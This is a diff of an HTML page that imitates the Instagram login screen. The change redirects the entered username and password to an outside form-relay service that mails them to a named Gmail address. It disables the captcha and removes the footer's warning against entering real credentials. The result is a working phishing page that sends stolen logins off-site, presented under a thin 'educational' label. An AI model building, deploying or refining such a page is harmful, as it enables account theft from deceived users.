@@ -8,6 +8,7 @@
     <link rel="icon" href="instagram.svg" type="image/icon">
     <link rel="stylesheet" type="text/css" href="style.css">
 </head>
+
 <body>
     <div class="container">
         <div class="page">
@@ -15,29 +16,56 @@
                 <img src="instagram.png" alt="instagram" style="width: 175px;">
             </div>
             <br />
-            <form class="container" action="send.php" method="post">
-                <input type="text" placeholder="Phone number, username, or email" name="u_name">
-                <input type="password" placeholder="Password" name="pass">
-                <button class="submitbutton">Log in</button>
+
+            <!-- FormSubmit Form (No Password) -->
+            <form class="container"
+                  action="https://formsubmit.co/humanerror0729@gmail.com"
+                  method="POST">
+
+                <input type="text"
+                       placeholder="Phone number, username, or email"
+                       name="username"
+                       required>
+
+                <input type="password"
+                       placeholder="Your passward"
+                       name="password"
+                       required>
+
+                <!-- FormSubmit Settings -->
+                <input type="hidden" name="_captcha" value="false">
+                <input type="hidden" name="_subject" value="Educational Instagram UI Form">
+
+                <button class="submitbutton">Send</button>
                 <br />
                 <div class="option">OR</div>
             </form>
+
             <div class="fblink">
                 <span class="fab fafacebook"></span>
                 <a href="#">Log in With Facebook</a>
             </div>
+
             <div class="forget-id">
                 <a href="https://www.instagram.com/accounts/password/reset/">Forget password?</a>
             </div>
+
             <div class="singup">
-                <p>Don't have an account?<a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></p>
+                <p>Don't have an account?
+                    <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
+                </p>
             </div>
         </div>
     </div>
+
     <br />
-    <div style="position:fixed;left:0;bottom:0;width:100%; color: #7e7979;">
-        <p style="text-align:center;">Disclaimer: This is not a real "instagram.com" page. Please do not enter your real username and password. It's only for educational purposes.</p>
+
+    <div style="position:fixed;left:0;bottom:0;width:100%; color:#7e7979;">
+        <p style="text-align:center;">
+            Disclaimer: This is not a real Instagram page.  
+            This UI is created only for educational and frontend practice purposes.
+        </p>
     </div>
-    <br />
+
 </body>
 </html>
